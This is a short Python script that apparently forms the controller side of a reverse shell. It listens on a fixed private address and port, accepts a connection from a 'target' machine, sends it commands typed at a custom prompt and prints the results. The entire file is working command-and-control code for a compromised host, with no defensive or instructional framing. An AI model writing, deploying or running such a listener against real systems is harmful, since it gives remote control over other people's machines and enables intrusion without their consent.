import socket
import json 
soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
ip = "192.168.123.85"
port = 9999

soc.bind((ip,port))
print("Listening......")
soc.listen(1)
connection = soc.accept()
target = connection[0]
ip = connection[1]
print(target)
print("Connected to: ", ip,":",port)

def data_acc():
    data = ""
    while True:
        try:
            data = data + target.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue
  
def communication_shell():
    while True:
        command = input("josseeth>>")
        data = json.dumps(command)
        target.send(data.encode())
        result = data_acc()
        print(result)

communication_shell()